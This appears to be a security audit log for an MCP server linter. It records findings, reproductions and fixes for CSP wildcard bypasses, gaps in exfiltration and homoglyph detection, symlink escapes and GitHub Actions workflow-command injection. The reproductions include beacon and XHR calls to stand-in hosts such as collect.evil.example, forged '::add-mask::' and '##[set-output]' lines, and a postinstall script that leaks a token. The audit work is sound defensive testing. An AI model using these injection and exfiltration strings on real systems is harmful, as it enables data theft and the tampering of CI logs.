У каждого одно значение resourceDomains: a=`https://*.vercel.app`, b=`https://*.vercel.app:443`, c=`https://*.co.uk:443`, d=`https://*.amazonaws.com:443`, e=`https://*.co.uk`. HTML каждого ресурса подгружает скрипты с evil.vercel.app, evil.co.uk и evil.amazonaws.com. Запускал так: `node dist/cli.js --format text --stdio -- node a0506.mjs`.

Что показал запуск:
- APPS-006 "is overly broad" выдаётся только для ui://a и ui://e. Для b, c и d APPS-006 нет совсем.
- По APPS-007 "evil.vercel.app not declared" приходит только для c, d и e, то есть b этот origin принимает. "evil.co.uk not declared" приходит для a, b и d, значит c принимает любой *.co.uk. "evil.amazonaws.com not declared" приходит для 4 из 5 ресурсов, без d.

Причина в коде (src/rules/apps.ts:136-141, 160-161). Регулярка `/^(scheme:\/\/)?\*\.([^*]+)$/` оставляет `:443` в wild[2]. В broadWildcard при этом `SHARED_CLOUD_SUFFIXES.includes('amazonaws.com:443')` возвращает false. А registrableDomain('x.co.uk:443') (net.ts:96-103) возвращает 'co.uk:443', потому что lastTwo='co.uk:443' не входит в MULTI_LABEL/SHARED_HOST_SUFFIXES. Это значение не совпадает с probe, поэтому запись не считается overly broad.

Получается, что исправление R032 обходится одним токеном с явным портом. Сочетание проверено на 1f24aba. В FINDINGS.md и REMEDIATION.md случай с явным портом не упоминается, перекрытие есть только с R032 по `*.co.uk` без порта.

Severity ставлю low, а не medium. APPS-006 по замыслу эвристика уровня warning, и при приёмке R032 severity тоже понизили как у пропущенной эвристики. CSP пишет сам автор сервера, так что это ложноотрицательный результат линтера, а не обход sandbox хоста.

Чем исправить: перед проверкой срезать `:port` (и путь) с wild[2].

findings.title: APPS-007 does not see common connect/resource loads: XHR POST, sendBeacon, Worker, <video poster>, <embed>/<object>
findings.claim: The XHR pattern matches only `.open("GET", url)`. There are no patterns for navigator.sendBeacon(url), new Worker/SharedWorker(url), the poster attribute, or embed/object tags. Telemetry posts and beacons, the usual ways a widget sends data out, never produce an 'undeclared origin' finding. The host CSP will block them at runtime, so the widget breaks and the linter has not warned about it.
findings.repro: RAN against dist/rules/util/html.js extractOrigins: `x.open("POST","https://collect.evil.example/c")` gives []; `navigator.sendBeacon("https://collect.evil.example/b", d)` gives []; `new Worker("https://w.evil.example/w.js")` gives []; `<embed src=...><object data=...>` gives []; `<video poster="https://img.evil.example/p.jpg" src="https://cdn.acme.example/v.mp4">` returns only cdn.acme.example. Control: fetch("https://api.acme.example/x") gives connect.
findings.fix: Use `\.open\(\s*["'](GET|POST|PUT|PATCH|DELETE|HEAD)["']` for XHR, add `navigator\.sendBeacon\(\s*lit` (connect) and `new\s+(Shared)?Worker\(\s*lit` (resource/worker), read `poster` in the video branch, and add embed/object to tagRe (src/data, as resource). Keep js confidence for the JS patterns (warning).

There is no embed or object, and for video/audio/img only src and srcset are read, so poster is never read. The jsPatterns list has fetch, WebSocket, EventSource, `.open("GET", ...)` (the method is hard-coded to GET), axios, ky, openExternal, ui/open-link and import/export. findings.title: INJ-002 false warning on biomedical notation (TNFα, NFκB, PPARγ, ERα) common in life-science servers
findings.claim: α, γ and κ are in GREEK_LOOKALIKE, so gene, receptor and cytokine names that end in a Greek letter count as homoglyph spoofing. The F091 fix exempted units (μ, Ω, Δ) but not this notation, which appears in almost every PubMed, UniProt or ChEMBL tool description.
findings.repro: RAN. t8.json: search_pubmed with description "Search PubMed abstracts, for example papers on TNFα or NFκB signaling, and return titles with PMIDs.". Output: `INJ-002 warning [claude,chatgpt] search_pubmed tool.description: mixed-script word "TNFα"`. mixedScript() also returns true for IFNγ, PPARγ, ERα and NFκB.
findings.fix: Exempt words where the Greek letters form a suffix after Latin uppercase letters or digits, or sit between uppercase letters (/^[A-Z0-9]+[α-ω]+[A-Z0-9]*$/u, or Latin-uppercase + Greek-lowercase), because a homoglyph attack swaps letters inside a lowercase word. Keep flagging Greek letters mixed into lowercase Latin runs (e.g. 'pαypal').

votes.evidence: injection.ts:113 GREEK_LOOKALIKE = /[ΑΒΕΖΗΙΚΜΝΟΡΤΥΧαγικνορυχϲϳ]/u includes α, γ and κ. I checked a local copy of mixedScript in node: TNFα true, NFκB true, PPARγ true, ERα true. The F091 fix only exempted μ, Ω, Δ, π and σ, so biomedical notation still gets a false INJ-002 warning. This is a new false-positive class, separate from F091 (units).

findings.title: INJ-002 misses homoglyphs from fullwidth Latin, Mathematical Alphanumerics and Armenian
findings.claim: mixedScript flags only Latin mixed with Cyrillic or Greek. Fullwidth 'Ｇ' is Script=Latin, so 'Ｇoogle' is a single-script word. Math bold '𝐏' is Script=Common. Armenian 'օ' (U+0585) looks exactly like 'o'. None of these words is flagged, though they are the standard brand-spoofing set alongside Cyrillic.
findings.repro: RAN. t3.json tool get_d with description "Return the Ｇoogle account summary from 𝐏aypal and the Gօօgle mirror." gives no INJ-002 finding. Control: 'Gооgle' with Cyrillic о gives INJ-002 warning.
findings.fix: Flag a word when NFKC(word) !== word and the word contains ASCII letters (catches fullwidth and math alphanumerics). Add Armenian (\p{Script=Armenian}) and Cherokee lookalikes to the second-script check, either with a small lookalike set like GREEK_LOOKALIKE or with the whole script.

votes.evidence: mixedScript (injection.ts:116-119) requires \p{Script=Latin} plus (Cyrillic or GREEK_LOOKALIKE). In node: 'Ｇoogle' false (fullwidth letters are Script=Latin), '𝐏aypal' false (math alphanumerics are Script=Common), 'Gօօgle' false (Armenian is not checked). Control 'Gооgle' (Cyrillic) true. Note: the spec and the rationale scope the heuristic to Cyrillic and Greek only, so this is a coverage gap of the heuristic, not a deviation from the spec. The factual claim holds.

findings.title: Listing JSON files are read through symlinked parent folders, which breaks the 'never through a link' promise and reads outside the plugin root
findings.claim: readCapped only lstat()s the last path component and opens with O_NOFOLLOW, which also guards only the last component. If `.claude-plugin` (or a folder in a declared mcpServers path such as `cfg/mcp.json`) is a symlink to a folder anywhere on disk, that file is parsed. Its contents then appear in findings (server names, URLs) and in the --verbose dump. image.ts already guards against this with a realpath check, but readJson does not. A third-party plugin linted in CI can thus pull local files (for example ~/.claude.json-style configs) into a published report.
findings.repro: Ran: mkdir -p outside/secretdir pl; put {"name":"leaked-outside-name","mcpServers":{"s":{"type":"http","url":"http://inner.corp.example/mcp"}}} in outside/secretdir/plugin.json; ln -s ../outside/secretdir pl/.claude-plugin; node dist/cli.js --plugin-dir pl --target claude --verbose. The output shows LST-007 quoting http://inner.corp.example/mcp from .claude-plugin/plugin.json, and the [listing] dump has "name": "leaked-outside-name". The same happens with --openai-manifest and "mcpServers": "./cfg/mcp.json" where cfg is a symlink: LST-024 quotes the URL from outside.
findings.fix: In readCapped, after the open, compare realpathSync(abs) (or fstat dev/ino against an lstat walk of each component) with realpathSync(root), as examineImage does, and refuse with 'is behind a symbolic link (not followed)'. Pass the root into readJson and readText.

Read the code at 1f24aba (src/listing/load.ts). readCapped (lines 47-56) runs lstatSync(abs) and opens with O_NOFOLLOW. Both checks apply only to the last path component. readJson (lines 97-99) checks with exists() (lstat) and then calls readCapped. There is no realpath check or containment check anywhere in that path. loadPluginDir reads join(dir,'.claude-plugin','plugin.json') directly, without using the walk results. walk lists `.claude-plugin` as kind 'symlink' but does not stop the read. loadOpenAiManifest joins the declared mcpServers path to root. It rejects '..' and absolute paths, but symlinked folders on the way pass. By contrast, image.ts lines 111-113 do check realpathSync(abs) against realpathSync(root), with the comment "A folder on the way may be a link". So readJson really lacks the guard. The file header says "links are listed but never followed", and the code breaks that promise.

The [listing] dump showed "name": "leaked-outside-name" and the URL. LST-007 also quoted "http://inner.corp.example/mcp" from .claude-plugin/plugin.json, and errors was []. findings.title: A --plugin-dir or --openai-manifest that is itself a symlink passes the CLI check, then gives a false LST-001/LST-016 error
findings.claim: cli.ts:457 checks the input with statSync, which follows links, so a symlink to a folder or file is accepted. The loader then uses lstat and reports 'is not a directory' / 'is a symbolic link (not followed)' as an error-level LST finding, so the run is BLOCKED. The user chose this path themselves, so refusing to follow it is not a vendor rule. The stderr text '--plugin-dir . is not a directory' is also misleading.
findings.repro: Ran: ln -s .../test/fixtures/listing/plugin-valid lnk/plugdir; node dist/cli.js --plugin-dir lnk/plugdir --target claude. Output: 'warning: --plugin-dir . is not a directory', 'x LST-001 the plugin folder is not a directory', 'Claude: BLOCKED (3 errors)'. With ln -s .../openai-valid/plugin.json lnk/plugin.json, --openai-manifest lnk/plugin.json gives 'x LST-016 plugin.json is a symbolic link (not followed)'.
findings.fix: Resolve the user-given root once (realpathSync(dir) / realpathSync(path)) before loading, and apply the no-follow policy only to entries inside it. Alternatively, make the CLI check use lstat and raise a UsageError (exit 2) that names the cause.

votes.evidence: Code at 1f24aba: in cli.ts around lines 452-461 the input check uses statSync(path), which follows links, so a symlink to a dir or file is accepted (no exit 2). loadPluginDir (src/listing/load.ts:156) then does lstatSync(dir).isDirectory(). For a link this is false, so it records {path:'.', message:'is not a directory'} and returns an empty plugin. loadOpenAiManifest (load.ts:218) calls readJson, which calls readCapped (load.ts:50-51). readCapped uses lstat and records 'is a symbolic link (not followed)'. There is no realpath or other guard between the CLI check and the loaders (grep finds no realpath in load.ts). Ran this in a detached worktree after build. `ln -s .../plugin-valid lnk/plugdir; node dist/cli.js --plugin-dir lnk/plugdir --target claude` printed 'warning: --plugin-dir . is not a directory' and errors LST-001 ('the plugin folder is not a directory'), LST-004 and LST-005, then 'Claude: BLOCKED (3 errors)', exit 1. The same folder given directly gives 'NO AUTOMATED BLOCKERS', PASS. `--openai-manifest lnk/plugin.json` (a link to openai-valid/plugin.json) printed 'x LST-016 ... plugin.json is a symbolic link (not followed) (MAN-015)' and 'ChatGPT: BLOCKED (1 error)', exit 1. The real file passes. So a path the user chose themselves gives a false error-level block, and the stderr text '. is not a directory' is misleading. The symlink cases are not covered by any symlink entry in FINDINGS.md or REMEDIATION.md (grep found nothing). I removed the worktree afterwards. Severity is medium: it falsely blocks valid input and goes against the error-only-for-a-documented-MUST principle, but it only happens when the input path is a symlink, and there is an easy workaround (pass the real path).

I built 1f24aba in a detached worktree, which I have since removed. The CLI accepts the path in src/cli.ts:458 with statSync, which follows links. The loader then uses lstat: src/listing/load.ts:156 is loadPluginDir, which reports `lstatSync(dir).isDirectory()` false as "is not a directory", and src/listing/load.ts:50-51 is readCapped, which reports "is a symbolic link (not followed)".

What I ran and what it showed:
- `ln -s test/fixtures/listing/plugin-valid lnk/plugdir`, then `node dist/cli.js --plugin-dir lnk/plugdir --target claude`. Output: "warning: --plugin-dir . is not a directory", then errors LST-001 "the plugin folder is not a directory", LST-004 (no README) and LST-005 (no LICENSE). Result "Claude: BLOCKED (3 errors)", exit 1.
- The same folder given by its real path: 0 errors, "NO AUTOMATED BLOCKERS", exit 0.

So a path the user chose, which the CLI check accepted, gives false error-level blockers and a FAIL exit. The "--plugin-dir . is not a directory" text is also misleading. Refusing links inside the plugin folder is fine, but no documented MUST is behind refusing the top-level input the user named. This is not in FINDINGS.md or REMEDIATION.md: a grep for symlink/symbolic in both found nothing. findings.title: SVG detection: a valid SVG with more than 4 KiB of prologue gets a false 'not an image' error, and a <svg in a comment gives a wrong size
findings.claim: sniffFormat looks for '<svg' only in the first 4096 bytes. An SVG with a license comment or a long DOCTYPE/metadata header before the root element is reported as 'no matching file signature', an error that blocks the run. svgSize takes the first '<svg' anywhere, including inside an XML comment, so a commented-out old tag sets the measured size. The reverse also happens: a text or HTML file named .png that mentions '<svg width=512 height=512>' passes as a 512x512 SVG icon.
findings.repro: Ran: an icon file '<?xml ...?>\n<!-- ' + 5 KB license text + ' -->\n<svg xmlns=... width="512" height="512">'. Result: 'x LST-027 ... lic.svg is not a PNG, JPEG, WebP or SVG image (no matching file signature)', BLOCKED. An SVG with '<!-- old: <svg width="4" height="4"> --><svg ... width="512" height="512">' gives 'x LST-027 ... is 4x4 px; icons must be 48 to 4096 px'. A .png file holding plain text with '<svg width="512" height="512">' gives no finding.
findings.fix: Strip comments, the XML declaration, processing instructions and the DOCTYPE (including its internal subset) from the decoded header (up to IMAGE_HEADER_BYTES). Then require the first element to be <svg (after optional whitespace) for both sniffing and sizing. Treat a non-matching text file as unknown-format.

votes.evidence: Read 1f24aba:src/listing/image.ts. The finding cites lines 259/313, but the code is at lines 23 and 77. sniffFormat (line 23) runs `/<svg[\s>/]/i.test(b.toString('utf8', 0, Math.min(b.length, 4096))))`, so it only looks at the first 4096 bytes, even though examineImage reads up to IMAGE_HEADER_BYTES = 256 KiB. When sniffFormat finds no format, examineImage returns problem 'unknown-format'. In src/rules/listing.ts, unmeasured() then returns that finding with no severity, and LST-027 is severity {chatgpt:'error'}, so the result is a blocking error with the text 'is not a PNG, JPEG, WebP or SVG image (no matching file signature)'. svgSize (line 77) uses `/<svg(?=[\s>/])([^>]*)>/i.exec(text)`. It takes the first match and does not skip comments or CDATA, so the size comes from a commented-out tag. Sniffing is also just a substring test, so a text/HTML file that contains '<svg ...>' is accepted as SVG, whatever its name. I ran the same regexes in node. A 5000-byte license comment before the root element gives sniff=false, which leads to unknown-format and an error. '<!-- old: <svg width="4" height="4"> --><svg width="512" height="512">' gives the attributes width="4" height="4", which leads to the 4x4 'must be 48 to 4096 px' error. Plain text with '<svg width="512" height="512">' gives sniff=true and passes as 512x512. Nothing else guards against these cases. I found no SVG/4096 entry in FINDINGS.md or REMEDIATION.md. This breaks the project principle that error is reserved for deterministic detection: a valid file gets a false error, BLOCKED. I rate it medium because a prologue over 4 KiB and commented-out svg tags are uncommon, and the false-negative case alone would be low.

At 1f24aba the code is at src/listing/image.ts:23 and :77, not 259/313. sniffFormat runs /<svg[\s>/]/i only on b.toString('utf8',0,4096). svgSize takes the first /<svg(?=[\s>/])([^>]*)>/i match anywhere in the text and does not skip comments. None of this appears in FINDINGS.md or REMEDIATION.md.

findings.title: Server stderr lines in --verbose start workflow commands in GitHub Actions
findings.claim: The `[stdio stderr]` tail goes through visibleText line by line, but nothing neutralizes a leading '::'. renderText does that at text.ts:180 and annotations use escapeCommand. A stdio server can therefore print '::error title=...::forged' or '::add-mask::', '::stop-commands::' and the runner executes it. This contradicts SECURITY.md:53 ('cannot ... start a line the GitHub runner reads as a workflow command'), the class closed for stdout by F135.
findings.repro: RAN: scratchpad a07/evil2.mjs writes '::error title=TOOL-000::forged annotation' and '  ::warning::indented' to stderr, then works as an MCP server. GITHUB_ACTIONS=true node dist/cli.js --no-config --verbose --no-color --stdio -- node evil2.mjs 2> e2.txt; grep '^\s*::' e2.txt shows lines 10-11 verbatim after the tool's own annotations.
findings.fix: Apply the same guard as text.ts:180 (replace /^(\s*):(?=:)/ with '$1\\u{3A}') to every stderr line built from server text: the stderr tail, the [http] trace and the [listing] dump. Better, move it into one exported ciSafeLine() helper in report/index.ts and use it in text.ts and cli.ts.

votes.evidence: Read at 1f24aba (git show, no worktree created). src/cli.ts:552: `stderrTail.split(/\r?\n/).map(visibleText).join('\n')`. This splits the server's stderr on newlines, so each server line becomes its own output line. visibleText (src/report/index.ts:82) only turns \p{Cc}/\p{Cf}/U+2028/2029 into \u{..}. It leaves ':' alone, so a line that starts with '::' or '  ::' passes through unchanged. The only '::' guard is the final map in renderText (src/report/text.ts:180, `^(\s*):(?=:)` -> `\u{3A}`). It covers only the text report on stdout. escapeCommand is used only in annotations and the fatal ann line (cli.ts:601). The --verbose block appends to `stderr` after the GITHUB_ACTIONS annotations (cli.ts:543-553). Only scrub(redactor) runs after that, and main() writes stderr raw (cli.ts:650), so no later guard exists. The existing regression test (test/remediation-w3c-cli-tests.test.ts:10) deliberately keeps "one line per server line" and checks only ESC/CR/bidi, not '::'. The author's run output is in /tmp/claude-1000/-home-kali-packages/fae74d01-791a-469a-ab5f-90cdb063ebe5/scratchpad/a07/e2.txt. Lines 10-11 there are `::error title=TOOL-000::forged annotation` and `  ::warning::indented`, verbatim after the tool's own escaped annotations. This contradicts SECURITY.md ("Server text cannot drive ... the GitHub runner ... or start a line the GitHub runner reads as a workflow command"). It is the stderr half of F135, which was fixed only for control characters. Severity medium, as for F135: it needs a hostile stdio server and opt-in --verbose under GITHUB_ACTIONS. The impact is forged or hidden annotations, ::add-mask:: and ::stop-commands:: (which can silence the tool's later output). set-env/set-output are disabled on GitHub, so there is no code execution.

I built 1f24aba in a detached worktree (npm ci --ignore-scripts, npm run build, both OK) and removed the worktree afterwards. The code at src/cli.ts:552 is `stderrTail.split(/\r?\n/).map(visibleText).join('\n')`. visibleText (src/report/index.ts:82) only turns Cc/Cf characters into \u{..}. It does nothing to a leading '::'. renderText does that separately at text.ts:180 (`l.replace(/^(\s*):(?=:)/, '$1\\u{3A}')`), and the verbose path never gets that step.

Repro: a stdio server script writes `::error title=TOOL-000::forged annotation\n  ::warning::indented\n::add-mask::foo\n` to stderr. I ran `GITHUB_ACTIONS=true node dist/cli.js --no-config --verbose --no-color --stdio -- node evil.mjs 2> e.txt`. In e.txt, lines 3-5 under `[stdio stderr]` are exactly `::error title=TOOL-000::forged annotation`, `  ::warning::indented` and `::add-mask::foo`. The GitHub runner reads lines like these as workflow commands. The tool's own annotation on line 1 is escaped correctly, so the gap is only in the verbose tail. The [http] lines are single lines that start with `[http]`, so they are not affected.

This contradicts the code comment at cli.ts:549-550, which says the stderr tail "cannot ... rewrite ... a CI log (F135)". It also goes against the intent of the F135 fix: FINDINGS.md:728 asked that in GITHUB_ACTIONS mode no stdout/stderr line start with '::'. The F135-verbose-stderr fix (deferred in REMEDIATION.md:106, later applied with visibleText) closed only the control-character half, so this is an incomplete fix, not a duplicate.

Strictly, SECURITY.md:53 promises this only for "Text and markdown reports". Verbose stderr is a diagnostic trace, so the doc contradiction is weaker than the finding says.

Why low and not medium: it needs the non-default --verbose. It only affects stdio, and a stdio server is code the job already runs as the same user on the runner, so it could write to the job log or GITHUB_ENV directly anyway. set-env/add-path are disabled. What it adds is forged annotations, add-mask or stop-commands that look like they came from the tool's output.

Fix: apply the same leading-'::' neutralization (as in text.ts:180) to each line of the stderr tail.

findings.title: GitHub annotations carry raw ESC and bidi characters from tool names and messages
findings.claim: annotations() puts subjectOf(f) and f.message through escapeCommand only, which escapes %, CR, LF and, for properties, ':' and ','. Every other control or format character passes through. A tool name with ESC[8m, ESC[2K or U+202E reaches the stderr log and the annotation title raw, so it can hide or recolour CI log text and reorder the title. The text and markdown reports show the same name as \u{1B}, because F135 fixed them but not the annotations.
findings.repro: RAN: scratchpad a07/evil3.mjs registers a tool named 'ok\u001b[2K\u001b[8mhidden‮x'. GITHUB_ACTIONS=true node dist/cli.js --no-config --no-color --stdio -- node evil3.mjs: stderr has 6 lines with raw ESC, e.g. '::error title=INJ-001 ok^[[2K^[[8mhidden<U+202E>x::...'. stdout has 0.
findings.fix: In annotations() wrap title and message in visibleText() before escapeCommand(). visibleText keeps tab, and CR and LF are already turned into %0D/%0A. Add a test with ESC and U+202E in a tool name.

votes.evidence: At 1f24aba, src/report/github.ts:10-13 escapeCommand replaces only %, CR, LF and, for properties, ':' and ','. annotations() at :41-42 builds the title from subjectOf(f), which returns the raw tool name (engine.ts:150-152), and the message from f.message. I reproduced it in my own worktree: a stdio SDK server with a tool named 'ok\u001b[2K\u001b[8mhidden‮x', run as GITHUB_ACTIONS=true node dist/cli.js --no-config --no-color --stdio -- node evil.mjs. stderr had 6 lines with raw ESC, e.g. '::error title=INJ-001 ok^[[2K^[[8mhidden<U+202E>x::...'. stdout had 0 such lines, because text.ts visibleText shows the same name as \u{1B}. F135 in FINDINGS.md covered only the text and markdown renderers, and no deferred item covers annotations. Low severity fits: the checked server itself has to be hostile.

findings.title: A listing-only report records toolFingerprints: [] instead of null, so as a baseline it reports every tool as added

If that report is then used as --baseline against a server, compareTools lists every tool as added, and --fail-on-drift exits 1. The correct result is 'not compared: the baseline checked no server'.
findings.repro: RAN: node dist/cli.js --no-config --plugin-dir test/fixtures/listing/plugin-valid --save-baseline bl.json; node dist/cli.js --no-config --baseline bl.json --fail-on-drift --stdio -- node test/fixtures/good-server.mjs -> exit 1, 'CHANGED TOOL DEFINITIONS (4 since baseline) · fails the run (--fail-on-drift)', '+ search_notes: added' and so on.
findings.fix: In incompleteTools(), return 'no server was checked (listing-only)' when snap.target.kind === 'listing', so the JSON has toolFingerprints: null and the drift reads 'not compared'.

votes.evidence: drift.ts:81-90: incompleteTools() returns undefined when fatal is unset, there is no tools error and toolLevel is 'ok'. toolFingerprints() (:94-96) then returns snap.tools.map(...), which is [] for a listing-only snapshot. compareTools (:108-125) only gives 'not compared' when the baseline is null or undefined, so [] marks every current tool as added. Reproduced at 1f24aba: --plugin-dir test/fixtures/listing/plugin-valid --save-baseline bl.json wrote toolFingerprints [] with coverage.toolLevel 'ok'. Then --baseline bl.json --fail-on-drift --stdio -- node test/fixtures/good-server.mjs printed 'CHANGED TOOL DEFINITIONS (4 since baseline) · fails the run (--fail-on-drift)' and '+ search_notes: added' and so on, and exited 1 while the Result line said PASS. FINDINGS.md and REMEDIATION.md have no item for this.

findings.title: The legacy '##[command]' runner syntax inside server text is not neutralized in the text report
findings.claim: The text guard rewrites only a leading '::'. The Actions runner also parses the v1 form '##[name props]data' anywhere in a line (ActionCommand.TryParse uses IndexOf("##[")). A tool or server name such as 'grab##[set-output name=verdict;]PASS' or 'x##[add-mask]FAIL' therefore reaches stdout unchanged. Because stderr is flushed before stdout, the impact is limited to masking words and setting extra step outputs in later stdout lines.
findings.repro: PARTLY RAN: scratchpad a07/evil.mjs. node dist/cli.js --no-config --no-color --stdio -- node evil.mjs prints 'Server  Evil ##[stop-commands]tok1 ...' and '  x TOOL-006 [claude] grab##[set-output name=verdict;]PASS: no title' verbatim. Whether the runner acts on them is from its source, not tested on a real runner.
findings.fix: In the same ciSafeLine() helper as A07-04, also rewrite '##[' as '#\u{23}[' in text output and stderr lines; markdown already escapes '['.

votes.evidence: text.ts:180 rewrites only a leading '::' (regex /^(\s*):(?=:)/), and src/ has no handling for '##['. Reproduced at 1f24aba: a server named 'Evil ##[stop-commands]tok1' with a tool named 'grab##[set-output name=verdict;]PASS'. stdout printed 'Server  Evil ##[stop-commands]tok1 1.0.0 · ...' and '  x TOOL-033 [claude, chatgpt] grab##[set-output name=verdict;]PASS: ...' unchanged, on about 10 lines. The runner side was not tested on a real runner and has no local source. I recall that actions/runner ActionCommand.TryParse (v1) finds the prefix with message.IndexOf("##["), and that ActionCommandManager falls back to it after TryParseV2, which matches the claim. No earlier item covers this: F135 and its fix address only '::'. Low severity fits: it needs a hostile server, and set-env and add-path are disabled on the runner.

areas.name: supply chain and pipeline
areas.coverage: Worktree at 1f24aba (detached, created and removed at the end), `npm ci --ignore-scripts` and `npm run build` OK. Read in full: package.json, the package-lock.json scan (install scripts, engines, integrity, registry origins, runtime count 96, undici 7.30.1), .github/workflows/{ci,release,docker,audit}.yml, .github/dependabot.yml, action.yml, Dockerfile, .dockerignore, .pre-commit-hooks.yaml, scripts/postbuild.mjs, src/proxy.ts, the docs/guide/ci.md Docker and pre-commit sections, the README GitHub Action section and Stability policy, CONTRIBUTING release steps, and FINDINGS.md / REMEDIATION.md for known items (F145, F151, F159, F160, F166, the v0 tag and the coverage deferrals were not re-reported). Ran: `npm pack --dry-run --json` (67 files, clean apart from the stale-dist point); the action run-step script extracted from action.yml with an argv printer (A08-01); an offline npx install-script demo with local tarballs (A08-02); the add-mask newline echo and the CLI CR/LF bearer check (A08-06); the CLI with no args as the pre-commit hook runs it (exit 2 usage, as documented); the listing-only Docker smoke-test command on the host (exit 0); --output into an unwritable dir (EACCES, exit 2); vitest test/remediation-w4d-action.test.ts and test/workflows.test.ts (18 passed). improvements.title: Clean dist before every build
improvements.detail: `build` is `tsc && node scripts/postbuild.mjs`, and neither step removes stale output. A file left behind in dist/ by a deleted or renamed module ends up in the tarball (verified: dist/old-removed-module.js appeared in `npm pack --dry-run` even though prepack rebuilt). CI and release are not affected because they check out fresh, but 0.2.0 was published from the maintainer's machine (REMEDIATION status log, 2026-11-02). Add `rm -rf dist` (or `node -e "fs.rmSync('dist',{recursive:true,force:true})"`) at the start of `build`.

improvements.title: Exercise the action's default npx path in CI
improvements.detail: Every ci.yml `action` step uses `cli-path: dist/cli.js`, so the path every user runs (version regex, `npx --yes mcp-review-check@<default>`, Git Bash and bash 3.2 behaviour of npx) is never executed. Add a push-to-main or post-release job that uses `uses: ./` with the default `version` against test/fixtures/good-server.mjs.

improvements.title: Chain docker.yml to the Release workflow instead of polling npm
improvements.detail: docker.yml starts in parallel with release.yml on the same tag and polls `npm view` for up to 30 minutes. When the release build fails (tests or tag mismatch), the Docker job burns 30 runner-minutes and fails with a misleading 'not published within 30 minutes'. Use `on: workflow_run: workflows: [Release], types: [completed]` with a success check, or move the image jobs into release.yml with `needs: publish`.

improvements.title: Verify the provenance attestation content, not only its presence
improvements.detail: release.yml:71-85 accepts any non-empty `dist.attestations`. Run `npm audit signatures` in a scratch install of the just-published version, or check the SLSA predicate's repository, workflow path and commit against GITHUB_REPOSITORY, the workflow ref and GITHUB_SHA. That proves the published bits come from this run.

improvements.title: Slim the runtime image
improvements.detail: The final stage is node:22-alpine with npm, npx, corepack and yarn, none of which the CLI uses at runtime. They add CVE-scanner noise and attack surface. Delete /usr/local/lib/node_modules/{npm,corepack} and /opt/yarn* in the final stage, or base it on a distroless or `node:22-alpine` + `apk del` variant. Also add the `org.opencontainers.image.revision` label from GITHUB_SHA.

improvements.title: Tag-release guard: the tag commit must be on main and green
improvements.detail: release.yml only checks that the tag matches package.json. A tag pushed on a branch commit that never passed ci.yml still publishes, because release.yml reruns tests only on ubuntu and Node 24. Add a step that checks `git merge-base --is-ancestor $GITHUB_SHA origin/main`, or query the ci.yml check-run for the SHA.

findings.title: extra-args written across several lines: every line after the first is dropped without a warning
findings.claim: `read -r -a extra <<< "$INPUT_EXTRA_ARGS"` reads only up to the first newline. A YAML block scalar (`extra-args: |`), the usual way to write a long option list, loses every option after line 1 without any message. The input's description says the value is "split on whitespace", and a newline counts as whitespace. Options that quietly go missing include `--fail-on-incomplete`, `--baseline <file>`, `--ignore`, `--max-duration` and `--config`. The CI gate becomes weaker, or a different gate runs, and the run still exits 0.
findings.repro:
Ran it. I extracted the `run:` block of the `run` step from action.yml into a script and set INPUT_CLI_PATH to a small node script that prints its argv. With INPUT_EXTRA_ARGS=$'--timeout 60000
--ignore TOOL-013
--fail-on-incomplete
' the CLI received [... "--timeout","60000","--stdio","node x.mjs"]. `--ignore TOOL-013` and `--fail-on-incomplete` were missing, and the step reported exit-code=0. The existing tests only use a single line (test/remediation-w4d-action.test.ts:139).
findings.fix: Read the whole value: `extra=(); read -r -d '' -a extra <<< "$INPUT_EXTRA_ARGS" || true` (works in bash 3.2; read -d '' returns 1 at EOF, hence the `|| true`). I checked it locally: all 6 tokens come through, and globbing is still off. Add a test case with a multi-line value to test/remediation-w4d-action.test.ts.

votes.evidence:
At 1f24aba, action.yml:111 sets INPUT_EXTRA_ARGS straight from inputs.extra-args. Line 127 does `if [ -n "$INPUT_EXTRA_ARGS" ]; then read -r -a extra <<< "$INPUT_EXTRA_ARGS"; ...`, and `read` stops at the first newline because no `-d ''` is given. Nothing earlier in the step checks for newlines or collapses them, and nothing warns. The input description at line 59 says "split on whitespace", which reads as if a newline would split too. I ran the exact line under bash with `set -u` and INPUT_EXTRA_ARGS=$'--timeout 60000
--ignore TOOL-013
--fail-on-incomplete
': `extra` came out as only [--timeout] [60000], so the other two options were lost without any message. extra-args is not mentioned in the README at 1f24aba, and grep finds no extra-args entry in REMEDIATION.md, so this is not a known or deferred item. Impact: a block-scalar `extra-args: |` quietly loses gate options such as --fail-on-incomplete, --baseline and --config, and the CI gate gets weaker while the step still exits 0. Medium fits: it is a silent false-pass in a CI gate, but only multi-line input triggers it. Fix: `mapfile`/`read -r -d '' -a extra < <(printf '%s' "$INPUT_EXTRA_ARGS")`, or first turn newlines into spaces (`${INPUT_EXTRA_ARGS//$'
'/ }`). I did not need a worktree, so I created none.

I read action.yml at commit 1f24aba with git show. Line 127 is `if [ -n "$INPUT_EXTRA_ARGS" ]; then read -r -a extra <<< "$INPUT_EXTRA_ARGS"; ...`. The input's description at line 59 says "split on whitespace", and the file says nothing about newlines or block scalars.

I copied that line into a script under scratchpad/a08/t.sh, with `set -u`, and set INPUT_EXTRA_ARGS=$'--timeout 60000\n--ignore TOOL-013\n--fail-on-incomplete\n'. Under bash, args came out as [x][--timeout][60000]. `--ignore TOOL-013` and `--fail-on-incomplete` were dropped and nothing was printed about it. This matches the claimed behaviour: `read` stops at the first newline.

I did not build the CLI: the loss happens in the bash step before the CLI starts, so the build is not needed to show it. A grep for extra-args or A08 in FINDINGS.md and REMEDIATION.md found nothing, so the issue is not already listed as known.

findings.title: The action runs npx without --ignore-scripts, after the bearer token is already in its environment
findings.claim: Line 130 exports MCP_REVIEW_CHECK_TOKEN, then line 138 runs `npx --yes mcp-review-check@$INPUT_VERSION`. That command installs the package and its ~96 runtime dependencies with lifecycle scripts enabled and resolves them fresh, without a lockfile (see A08-03). So any preinstall/postinstall script anywhere in that tree runs inside the user's job with the server token in env, next to the job's GITHUB_TOKEN-scoped environment and the workspace. The repository's own policy is the opposite everywhere else: ci.yml/release.yml use `npm ci --ignore-scripts` and the Dockerfile uses `npm install --ignore-scripts`. Today no runtime dependency has an install script (I checked the lockfile: only esbuild and fsevents, both dev), so the risk is a future compromised transitive release, the worm-via-postinstall pattern.
findings.repro: Ran it offline with local tarballs. A fake CLI package depends on `evil-dep`, whose postinstall writes process.env.MCP_REVIEW_CHECK_TOKEN to a file. `MCP_REVIEW_CHECK_TOKEN=SYNTH-token npx --yes --offline --package fake-cli-1.0.0.tgz fake-cli` printed `leak: SYNTH-token`. The same run with `npm_config_ignore_scripts=true` printed `leak with ignore-scripts: none`, and the CLI still ran.
